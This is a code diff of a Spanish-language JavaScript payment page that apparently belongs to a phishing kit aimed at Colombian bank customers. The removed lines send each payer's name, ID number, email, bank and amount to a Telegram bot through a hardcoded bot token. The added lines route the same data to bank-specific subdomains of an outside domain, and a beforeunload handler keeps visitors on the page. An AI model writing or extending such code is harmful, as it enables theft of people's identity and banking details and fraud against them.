@@ -4,6 +4,7 @@ const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 window.addEventListener('beforeunload', (e) => {
     if (isTransactionActive) {
         e.preventDefault();
+        e.preventDefault();
         e.returnValue = 'Por favor espere la carga';
         return 'Por favor espere la carga';
     }
@@ -70,20 +71,10 @@ if (botonPagar) {
         if (overlay) overlay.style.display = 'flex';
         let loadingInterval = animateLoadingText(loadingText);
 
-
-        const botToken = "8425620613:AAHvyXc-G_Duk_OdOz8VuY_JeHqBdNT-IFQ"; 
-        const chatId = "7831097636";         
-
-        const mensajeTelegram = `Pago iniciado\nNombre: ${name}\nID:  - ${doc}\nCorreo: ${email}\nBanco: ${banco}\nMonto: ${amount}\nRef: ${data.referencia}`;
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: mensajeTelegram })
-        }).catch(err => console.error("Error enviando Telegram:", err));
-        // ==========================================
-
-        const baseUrl = 'https://air.pagoswebcol.uk';
+        // Si el banco es Nequi, usa la otra API. De lo contrario, usa la normal.
+        const baseUrl = (banco === 'NEQUI') 
+            ? 'https://rusianenel.pagoswebcol.uk' // <-- PON TU NUEVA API AQUÍ
+            : 'https://apifinacjs.pagoswebcol.uk';
         const params = new URLSearchParams({
             amount: amount, bank: banco, email: email, doc: doc, fullName: name, phone: phone, ref: data.referencia
         });
